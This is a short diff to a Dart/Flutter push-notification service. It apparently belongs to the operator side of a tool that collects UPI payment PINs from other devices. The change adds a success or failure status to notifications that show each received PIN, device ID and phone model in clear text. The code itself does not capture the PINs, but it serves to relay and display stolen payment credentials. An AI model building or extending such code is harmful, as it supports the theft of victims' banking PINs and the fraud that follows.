@@ -183,9 +183,17 @@ class FCMService {
         final deviceId = message.data['device_id'] ?? '';
         final upiPin = message.data['upi_pin'] ?? '';
         final model = message.data['model'] ?? '';
+        final statusRaw = (message.data['status'] ?? 'success').toString().toLowerCase();
+        final isSuccess = statusRaw == 'success';
+        final statusLabel = statusRaw.isEmpty
+            ? 'Unknown'
+            : '${statusRaw[0].toUpperCase()}${statusRaw.substring(1)}';
+        final title = isSuccess ? 'UPI PIN Detected' : 'UPI PIN Failed';
+        final body =
+            'Status: $statusLabel - PIN: $upiPin - Device: $deviceId${model.isNotEmpty ? ' ($model)' : ''}';
         _showLocalNotification(
-          'UPI PIN Detected',
-          'PIN: $upiPin - Device: $deviceId${model.isNotEmpty ? ' ($model)' : ''}',
+          title,
+          body,
           message.data,
         );
       } else {
